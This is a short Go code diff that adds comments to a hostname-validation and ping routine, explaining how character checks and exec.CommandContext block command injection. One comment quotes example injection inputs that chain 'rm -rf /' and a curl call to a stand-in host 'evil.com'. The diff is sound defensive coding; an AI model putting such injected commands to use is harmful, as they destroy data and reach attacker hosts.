@@ -341,8 +341,10 @@ func (m *ModemCheck) runSystemPing(host string, count int) (avg string, loss str
 		return "", "", "", ""
 	}
 
+	// SECURITY: Validate hostname characters to prevent command injection
 	// Check for obviously invalid characters that could indicate injection attempts
 	// Valid hostnames and IPs should only contain alphanumeric, dots, hyphens, and colons (IPv6)
+	// This prevents malicious inputs like: "google.com; rm -rf /" or "8.8.8.8 && curl evil.com"
 	for _, char := range host {
 		if !((char >= 'a' && char <= 'z') || (char >= 'A' && char <= 'Z') ||
 			(char >= '0' && char <= '9') || char == '.' || char == '-' || char == ':') {
@@ -360,6 +362,8 @@ func (m *ModemCheck) runSystemPing(host string, count int) (avg string, loss str
 		countFlag = "-n"
 	}
 
+	// SECURITY: exec.CommandContext prevents shell injection by not invoking a shell
+	// The hostname is passed as a separate argument, not concatenated into a command string
 	cmd := exec.CommandContext(ctx, "ping", countFlag, strconv.Itoa(count), host)
 	output, err := cmd.CombinedOutput()
 
